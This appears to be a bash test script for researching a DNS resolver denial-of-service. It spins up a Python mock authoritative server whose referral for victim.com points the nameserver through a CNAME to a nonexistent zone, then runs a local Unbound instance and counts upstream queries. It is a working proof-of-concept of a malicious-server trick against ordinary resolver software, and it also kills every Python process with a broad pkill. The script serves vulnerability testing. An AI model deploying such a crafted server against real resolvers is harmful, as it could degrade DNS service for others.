#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/cname-nxdos-test2"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
sleep 1

echo "=== NS->CNAME->NXDOMAIN DoS Test ==="

# Auth server
cat > "$VDIR/auth.py" << 'PYEOF'
#!/usr/bin/env python3
import socket,struct,time,json,sys
LOG="/workspace/output/cname-nxdos-test2/auth.jsonl"
def enc(n):
    if not n or n=='.': return b'\x00'
    r=b''
    for l in n.rstrip('.').split('.'):
        if l: r+=bytes([len(l)])+l.encode()
    return r+b'\x00'
def rr(n,t,c,ttl,d): return enc(n)+struct.pack('!HHI',t,c,ttl)+struct.pack('!H',len(d))+d
def log(q,t,f,r):
    with open(LOG,'a') as fh: fh.write(json.dumps({'q':q,'t':t,'f':f,'r':r,'ts':time.monotonic()})+'\n')
    print(f"[AUTH] {f}: {q} {t} -> {r}",flush=True)
SOA_V=enc('ns.victim.com.')+enc('admin.victim.com.')+struct.pack('!IIIII',2026100901,3600,900,604800,86400)
SOA_S=enc('ns.safe.com.')+enc('admin.safe.com.')+struct.pack('!IIIII',2026100902,3600,900,604800,86400)
SOA_DZ=enc('ns1.deadzone.xyz.')+enc('admin.deadzone.xyz.')+struct.pack('!IIIII',2026100906,3600,900,604800,86400)
QTM={1:'A',2:'NS',5:'CNAME',6:'SOA',28:'AAAA'}
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind(('127.0.0.2',53))
sock.settimeout(0.5)
print("[AUTH] 127.0.0.2:53 listening",flush=True)
while True:
    try:
        data,addr=sock.recvfrom(4096)
        if len(data)<12: continue
        txid,fl,qd=struct.unpack('!HHH',data[:6])
        if fl>>15: continue
        off=12;lab=[]
        while off<len(data) and data[off]!=0:
            ll=data[off]
            if ll==0 or off+1+ll>len(data): break
            if ll>63: off+=2; break
            lab.append(data[off+1:off+ll].decode('ascii',errors='replace'))
            off+=1+ll
        else: off+=1
        qn='.'.join(lab)
        if off+4>len(data): continue
        qt,qc=struct.unpack('!HH',data[off:off+4])
        qtn=QTM.get(qt,f'T{qt}')
        qnl=qn.lower().rstrip('.')
        # Root
        if qnl=='' and qt==2:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,1)
            r+=enc('.')+struct.pack('!HH',2,qc)
            r+=rr('.',2,qc,86400,enc('ns1.'))
            r+=rr('ns1.',1,qc,86400,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'ROOT'); sock.sendto(r,addr); continue
        if qnl=='ns1' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns1.')+struct.pack('!HH',1,qc)
            r+=rr('ns1.',1,qc,86400,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'ROOT_A'); sock.sendto(r,addr); continue
        # com TLD
        if qnl=='com' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,1)
            r+=enc('com.')+struct.pack('!HH',qt,qc)
            if qt==2:
                r+=rr('com.',2,qc,86400,enc('ns1.com.'))
                r+=rr('ns1.com.',1,qc,86400,struct.pack('!I',0x7f000002))
            else:
                r+=rr('com.',6,qc,86400,enc('ns1.com.')+enc('admin.com.')+struct.pack('!IIIII',2026100904,3600,900,604800,86400))
            log(qn,qtn,addr[0],'COM'); sock.sendto(r,addr); continue
        if qnl=='ns1.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns1.com.')+struct.pack('!HH',1,qc)
            r+=rr('ns1.com.',1,qc,86400,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'COM_A'); sock.sendto(r,addr); continue
        # com->victim.com referral with CNAME glue
        if qnl=='victim.com' or qnl.endswith('.victim.com'):
            r=struct.pack('!HHHHHH',txid,0x8000,1,0,1,1)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('victim.com.',2,qc,300,enc('ns.victim.com.'))
            r+=rr('ns.victim.com.',5,qc,300,enc('nonexistent.deadzone.xyz.'))
            log(qn,qtn,addr[0],'REF_VICTIM'); sock.sendto(r,addr); continue
        # ns.victim.com -> CNAME -> nonexistent.deadzone.xyz
        if qnl=='ns.victim.com' and qt in (1,5,28):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns.victim.com.')+struct.pack('!HH',qt,qc)
            r+=rr('ns.victim.com.',5,qc,300,enc('nonexistent.deadzone.xyz.'))
            log(qn,qtn,addr[0],'CNAME_NX'); sock.sendto(r,addr); continue
        # deadzone.xyz -> NXDOMAIN
        if qnl.endswith('.deadzone.xyz') or qnl=='deadzone.xyz':
            r=struct.pack('!HHHHHH',txid,0x8003,1,0,1,0)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('deadzone.xyz.',6,qc,300,SOA_DZ)
            log(qn,qtn,addr[0],'NX_DEADZONE'); sock.sendto(r,addr); continue
        # safe.com (control)
        if qnl=='safe.com' or qnl.endswith('.safe.com'):
            r=struct.pack('!HHHHHH',txid,0x8000,1,0,1,1)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('safe.com.',2,qc,300,enc('ns.safe.com.'))
            r+=rr('ns.safe.com.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'REF_SAFE'); sock.sendto(r,addr); continue
        if qnl=='ns.safe.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns.safe.com.')+struct.pack('!HH',1,qc)
            r+=rr('ns.safe.com.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'SAFE_A'); sock.sendto(r,addr); continue
        if qnl=='www.safe.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('www.safe.com.')+struct.pack('!HH',1,qc)
            r+=rr('www.safe.com.',1,qc,300,struct.pack('!I',0x05050505))
            log(qn,qtn,addr[0],'SAFE_WWW'); sock.sendto(r,addr); continue
        # Default NXDOMAIN
        r=struct.pack('!HHHHHH',txid,0x8003,1,0,0,0)+enc(qn)+struct.pack('!HH',qt,qc)
        log(qn,qtn,addr[0],'NXDOMAIN'); sock.sendto(r,addr)
    except socket.timeout: continue
    except Exception as e: print(f"[AUTH] Err: {e}",file=sys.stderr)
PYEOF

> "$VDIR/auth.jsonl"
python3 "$VDIR/auth.py" > "$VDIR/auth.log" 2>&1 &
sleep 1

# Unbound
cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF
cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/cname-nxdos-test2"
    pidfile: "/workspace/output/cname-nxdos-test2/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/cname-nxdos-test2/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/cname-nxdos-test2/hint"
    domain-insecure: "."
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no
    qname-minimisation: no
stub-zone:
    name: "com"
    stub-addr: 127.0.0.2@53
stub-zone:
    name: "deadzone.xyz"
    stub-addr: 127.0.0.2@53
remote-control:
    control-enable: no
CONF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/ub_stdout.log" 2>&1 &
sleep 3
if ! kill -0 $! 2>/dev/null; then echo "UNBOUND FAILED"; cat "$VDIR/unbound.log"|head -20; exit 1; fi
echo "Unbound started"

# T1
echo "=== T1: First query ==="
> "$VDIR/auth.jsonl"
dig @127.0.0.1 -p 5353 www.victim.com A +time=15 +tries=1
sleep 2
Q1=$(wc -l < "$VDIR/auth.jsonl")
echo "Upstream: $Q1"

# T2
echo "=== T2: Same query ==="
> "$VDIR/auth.jsonl"
dig @127.0.0.1 -p 5353 www.victim.com A +time=5 +tries=1
sleep 1
Q2=$(wc -l < "$VDIR/auth.jsonl")
echo "Upstream: $Q2"

# T3
echo "=== T3: Different subdomain ==="
> "$VDIR/auth.jsonl"
dig @127.0.0.1 -p 5353 mail.victim.com A +time=15 +tries=1
sleep 2
Q3=$(wc -l < "$VDIR/auth.jsonl")
echo "Upstream: $Q3"

# T4: Control
echo "=== T4: safe.com ==="
dig @127.0.0.1 -p 5353 www.safe.com A +time=10

# Auth log
echo "=== AUTH KEY LOG ==="
grep -E "CNAME_NX|NX_DEADZONE|REF_VICTIM|SAFE" "$VDIR/auth.jsonl" | head -20

# Unbound log
echo "=== UNBOUND KEY LOG ==="
grep -iE "cname|deadzone|nonexist|servfail|out_of_range|no_target" "$VDIR/unbound.log" | head -20

# Summary
echo "=== SUMMARY ==="
echo "T1 first:     $Q1 upstream"
echo "T2 repeat:    $Q2 upstream"
echo "T3 diff sub:  $Q3 upstream"

pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
echo "DONE"
